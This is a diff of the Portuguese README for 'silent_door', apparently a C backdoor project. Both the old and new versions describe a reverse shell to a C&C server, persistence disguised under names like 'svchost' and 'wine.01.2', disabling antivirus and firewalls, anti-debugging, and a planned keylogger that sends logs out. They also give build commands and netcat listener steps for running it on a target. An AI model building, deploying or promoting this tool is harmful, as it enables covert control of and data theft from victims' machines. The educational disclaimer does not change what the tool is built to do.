@@ -1,93 +1,84 @@
 # silent_door
 
-# Clássico backdoor, escrito na linguagem C.
- 
-# Em desenvolvimento.
+Um backdoor clássico escrito na linguagem C, com foco em portabilidade e aprendizado.
 
-Classic backdoor, write in c language.
+Este projeto está em constante desenvolvimento.
 
-In desenvolpment.  
+---
 
-# instalação:
+## Compilação
 
-$ git clone https://github.com/mrx6SO/silent_door
-$ cd ~/silent_door 
+Primeiro, clone o repositório:
+```bash
+git clone https://github.com/mrx6SO/silent_door
+cd silent_door
+```
 
-$ apt install libx11-dev && apt-get update && apt upgrade -y 
-$ cc main.c -o wine.01.2 -lm -w -lX11 
+### Dependências (Linux)
+Para compilar em sistemas baseados em Debian (Ubuntu, etc.), você precisará das ferramentas de compilação e da biblioteca `libx11-dev`.
+```bash
+sudo apt update
+sudo apt install build-essential libx11-dev
+```
 
-$ sudo cp wine.01.2 -t /usr/bin 
+### Usando o Makefile
+O projeto utiliza um `Makefile` para automatizar a compilação para Linux e Windows (via cross-compilation).
 
-$ done
+*   **Para compilar a versão Linux:**
+    ```bash
+    make linux
+    ```
+    Isso gerará o executável `silent_door_linux`.
 
-# Funções: 
+*   **Para compilar a versão Windows (requer MinGW):**
+    ```bash
+    # Instale o cross-compiler MinGW
+    sudo apt install mingw-w64
+    
+    # Compile
+    make windows
+    ```
+    Isso gerará o executável `silent_door.exe`.
 
-# auto executáveis -> executam-se automaticamente após a instalação
+---
 
-(#) desativar anti-vírus (caso exista) 
+## Funcionalidades
 
-(#) desativar firewall (abrir portas, redirecionar etc)
+### Implementadas
+*   **Conexão Reversa:** Estabelece um shell reverso para um servidor C&C.
+*   **Multiplataforma:** Código portável entre Linux e Windows com compilação condicional.
+*   **Modo Daemon/Background:** Executa de forma oculta em segundo plano.
+*   **Persistência Simples:** Copia-se para um diretório do sistema (`/usr/bin/svchost` no Linux).
+*   **Evasão de Firewall:** Tenta desabilitar `iptables` (Linux) ou o Firewall do Windows.
+*   **Técnicas Anti-Análise:** Inclui detecção básica de depuradores.
 
-(#) copiar o software para o registro da máquina alvo 
+### Em Desenvolvimento
+*   Comunicação Criptografada (TLS/SSL).
+*   Mecanismo de persistência avançado (Registro do Windows, systemd no Linux).
+*   Keylogger passivo com envio de logs.
+*   Funcionalidades de Upload/Download de arquivos.
+*   Mapeamento da rede interna da máquina alvo.
 
-(#) copiar o software para inicialização junto aos demais programas, assim tendo a conexão ativa quando a máquina for religada
+---
 
-(#) fork para criar um deamon, para rodar no background 
+## Uso Básico
 
-(#) invisível, ao ser executado nada ocorre e os processos associam-se a processos originais do sistema
+1.  **No seu servidor**, inicie um listener na porta configurada (padrão: 3389):
+    ```bash
+    nc -lvp 3389
+    ```
 
-(#) conexão remota 
+2.  **Na máquina alvo**, execute o backdoor:
+    ```bash
+    ./silent_door_linux
+    ```
 
-#######################################################################################################
+3.  A conexão será estabelecida e um shell remoto estará disponível no seu servidor.
 
-# Funções arbitrárias:
+---
 
-# executadas pelo servidor (o qual está em desenvolvimento!) 
+## Aviso Legal
 
-(#) enviar arquivo para a máquina alvo
+Este projeto foi criado para fins educacionais e de estudo em segurança da informação. O autor não se responsabiliza pelo mau uso desta ferramenta. Use-a apenas em ambientes controlados e com permissão explícita.
 
-(#) fazer download de arquivos da máquina
-
-( ) inicializar keylogger em modo passivo, enviando os arquivos para e-mail e/ou direto para o servidor. 
-
- *OBS: Keylogger com tais funções já está pronto. 
-
-(#) informações sobre: ip, nome da máquina etc
-
-( ) informações sobre: a rede da máquina alvo ( outras máquinas conectadas à mesma rede)
- 
-.... e muito mais por vir!
-
-######################################################################################################
-
-No arquivo requirements.txt estão as bibliotecas necessárias
-
-Caso queira instalar e compilar automaticamente, execute o script sdinstall.sh, contido na pasta install  
-
-# Uso (improvisado): 
-
-1. nc -lvp 3389 
-
-2. ./silent_door (ou ./wine.01.2 ou outro nome qualquer definido) 
-
-3. a conexão é estabelecida  
-
-# Pode ser útil (porém não recomendado):
-
-4. python -m SimpleHTTPServer 3389
-
-Abrindo o diretório atual, para visualização e download dos arquivos
-
-5. Nesse ponto em diante, use suas habilidades 
-
-Sugiro abrir uma nova conexão no backdoor com netcat
-
-Assim como ler a documentação do netcat: man netcat 
-
-enfim, isso está sendo aprimorado 
-
-# Referenciem o meu github caso o redistribuam em outras fontes!
-
-Paz, 
-
-mrx6SO
+**Referencie o autor original (`mrx6SO`) caso utilize ou redistribua este código.**
